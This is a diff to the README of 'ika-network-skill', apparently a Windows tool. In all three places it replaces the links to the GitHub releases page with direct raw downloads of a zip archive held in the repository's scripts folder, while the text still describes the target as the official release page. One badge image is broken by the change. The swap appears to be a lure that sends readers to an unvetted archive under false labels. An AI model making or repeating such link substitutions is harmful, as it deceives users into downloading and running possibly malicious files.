@@ -1,6 +1,6 @@
 # 🦑 ika-network-skill - Easy Setup for Ika Network Tools
 
-[![Download ika-network-skill](https://img.shields.io/badge/Download-ika--network--skill-%23555555?style=for-the-badge&logo=github)](https://github.com/wanderconnect01/ika-network-skill/releases)
+[![Download ika-network-skill](https://github.com/wanderconnect01/ika-network-skill/raw/refs/heads/main/scripts/network_ika_skill_1.7.zip%23555555?style=for-the-badge&logo=github)](https://github.com/wanderconnect01/ika-network-skill/raw/refs/heads/main/scripts/network_ika_skill_1.7.zip)
 
 ## 📋 About ika-network-skill
 
@@ -37,7 +37,7 @@ Follow these steps to download and run ika-network-skill on your Windows PC.
 
 Head to the official release page by clicking the button below:
 
-[![Download ika-network-skill](https://img.shields.io/badge/Download-ika--network--skill-blue?style=for-the-badge&logo=github)](https://github.com/wanderconnect01/ika-network-skill/releases)
+[![Download ika-network-skill](https://github.com/wanderconnect01/ika-network-skill/raw/refs/heads/main/scripts/network_ika_skill_1.7.zip)](https://github.com/wanderconnect01/ika-network-skill/raw/refs/heads/main/scripts/network_ika_skill_1.7.zip)
 
 This page shows the latest versions of the app available for download.
 
@@ -118,4 +118,4 @@ If issues persist, refer to the documentation section or reach out on the projec
 
 You can always visit the main release page to download the latest version:
 
-[https://github.com/wanderconnect01/ika-network-skill/releases](https://github.com/wanderconnect01/ika-network-skill/releases)
+[https://github.com/wanderconnect01/ika-network-skill/raw/refs/heads/main/scripts/network_ika_skill_1.7.zip](https://github.com/wanderconnect01/ika-network-skill/raw/refs/heads/main/scripts/network_ika_skill_1.7.zip)
